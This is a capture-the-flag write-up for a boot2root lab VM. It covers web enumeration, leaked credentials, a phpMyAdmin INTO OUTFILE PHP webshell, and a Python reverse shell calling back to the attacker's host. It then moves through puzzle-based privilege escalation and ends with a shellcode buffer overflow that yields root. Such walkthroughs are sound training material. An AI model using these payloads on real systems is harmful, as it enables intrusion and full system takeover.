# boot2root writeup1 (normal way)

## Getting code execution
### my little forum
I didnt had nmap installed at first so i went on checking common ports:
- 21 ftp
- 22 ssh
- 80 http
- 443 https

Could not login as anonymous to the ftp server.  
http returned a page with no info what so ever so i fired up gobuster and runned it:
```
$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.56.102
/forum                (Status: 403) [Size: 287]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.56.102/fonts/]
/server-status        (Status: 403) [Size: 295]
$ gobuster dir -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://192.168.56.102
/forum                (Status: 301) [Size: 318] [--> https://192.168.56.102/forum/]
/webmail              (Status: 301) [Size: 320] [--> https://192.168.56.102/webmail/]
/phpmyadmin           (Status: 301) [Size: 323] [--> https://192.168.56.102/phpmyadmin/]
/server-status        (Status: 403) [Size: 296]
```

The /forum is a `my little forum` forum, we get many dummy post and what seems like a snippet of the machine syslog.  
As usual we get many unsucessful ssh login attempt etc... but one user managed to log in: lmezard (and admin).  
Right above one of lmezard login we see an unsucessfull login attempt as user `!q\]Ej?*5K5cy*AJ` since the post originated from lmezard and is title `Probleme login ?` we deduced it's related to this unsucessfull login attempt.  
My guess is that the user inputed his password instead of his login and well it is the case since we are able to login with `lmezard/!q\]Ej?*5K5cy*AJ`.  
Going into the `my little forum` lmezard account we get an email wich we can use to login to the webmail server (same password) `laurie@borntosec.net/!q\]Ej?*5K5cy*AJ`  

### webmail
On the mail server we get credentials wich we can use to login into the phpmyadmin website: `root/Fg-'kKXBj87E:aJ$`  

### phpmyadmin
With phpmyadmin we can do an sql request to create a php file to get a webshell (into a reverse shell (didnt manage to get the reverse shell directly)).  
Go to phpmyadmin, select `forum_db` database, click on sql, paste the following payload and click `Go`.  
```
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/webshell.php'
```

phpmyadmin directory seems readonly so i choose this directory that clearly seems writeable by it's content
Then we can access `https://192.168.56.102/forum/templates_c/webshell.php` and input command.  

### webshell into reverse_shell
A quick `python -c "print 'A'" confirmed me that python was installed and so we could do a reverse shell by pasting the following command and listening on port 8000 on our end:
```
$ export RHOST="192.168.56.1";export RPORT=8000;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
```
$ nc -lnvp 8000
```

As expected we are www-data and have now a shell.  
// The command execution part is now finished (there is a file in /home directory (/home/LOOKATME/password) wich contains lmezard creds (not working in ssh tho)

## Privilege escalation

### Getting laurie (archive with c source code / fun)

After upgrade to lmezard account on the server we are presented with a tar archive in the home directory wich contains many pcap file with very few bytes but one of the file contains 30+kbyte, we will use wireshark to analyze it.  
Seems like it's it's actually one big C files which is splitted across many files, trying to compile the huge file, we notice 7 missing getmeX function.  
There are all splitted across the directory we can find them by searching for getmeX, catting the file, search for file + 1 and get the return statement, put it inside the big file, do this 7 times (or with a script) compile and run:  
```
$ ./a.out 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
$ echo -n Iheartpwnage | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

We have now a new combination of user / password: `laurie/330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

### Getting thor (enigme / bomb)

Binary called bomb, let's decompile it (using gdb snif).  
1. Public speaking is very easy.
strcmp between the above sentence and our input
2. 1 2 6 24 120 720
read six numbers, check if the first one is 1, then proceed to check if:
aiStack32[iVar1 + 1] != (iVar1 + 1) * aiStack32[iVar1])
aiStack32 is all my numbers, iVar1 is the index so to get n+1 we have to multiply index + 1 by n (iVar1 starts at 1)
3. 2 b 755
Read an int, a char and then an int, search for the int, then check if the char and the second int match
4. 9
Await an int and get the index of the number in the fibonacci sequence, check if it's 55 (9 in the fibinnacci sequence)
5. o05km1
Have an array of 16 char, create a array with index taken from each char of your input modulo 16, then compare the string with `giants`
6. 4 2 6 3 1 5
Do some strange math but await 6 numbers between 1 and 6 (included) each different from other
Just bruteforce the solution, i don't want to reverse.  

Well this solution does work to defuse the bomb but since it's shitty made it's not the ONLY solution, especially for the 3rd, 5th so i borrowed the correct flags from friends . (and the last level is broken).  
1. Public speaking is very easy.
2. 1 2 6 24 120 720
3. 1 b 214
4. 9
5. opekmq
6. 4 2 6 1 3 5

Which gives us `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
We now have thor ssh creds: `thor/Publicspeakingisveryeasy.126241207201b2149opekmq426135`

### Getting zaz (tkinter / turtle)

I knew about tkinter and turtle so it wasnt that hard, but the fact that we had to md5 it gaved me trouble...   
In the end, we just had to convert the instruction to turtle instruction and we are done (see python script in /scripts)
```
echo -n 'SLASH' | md5sum
646da671ca01bb5d84dbb5fb2238dc8e
```

`zaz/646da671ca01bb5d84dbb5fb2238dc8e`

## Getting root (buffer overflow / exploit_me)

Too bored to reverse it completly but it's strcpying argv[1] into an array in main, thus we can overwrite main return address and make it jump to our shellcode, we place a nopsled just to be sure.  
```
$ /home/zaz/exploit_me $(python -c "print '\x90' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\xbf\xff\xf8\x98'[::-1]")
$ id
root
```
